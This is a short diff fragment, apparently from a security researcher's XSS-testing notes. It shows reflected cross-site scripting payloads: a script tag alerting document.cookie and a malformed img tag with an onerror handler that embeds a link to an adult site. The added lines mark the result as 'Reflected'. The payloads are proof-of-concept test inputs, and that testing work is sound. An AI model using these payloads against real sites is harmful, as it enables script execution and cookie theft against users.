@@ -47,6 +47,10 @@ nu11secur1ty<script>alert(document.cookie)</script>
 - 0.1 - chalga
 ```
 </span><img src=https://raw.githubusercontent.com/nu11secur1ty/XSSight/master/nu11secur1ty/images/chalga-tochilka.gif <a href=https://pornhub.com/> onerror=alert(1) /></span>
+
+### Out:
+- Reflected
+</span><img src=https://chalgamemes.wordpress.com/wp-content/uploads/2016/01/vovmjo.gif></span>
 ```
 
 - 0.4
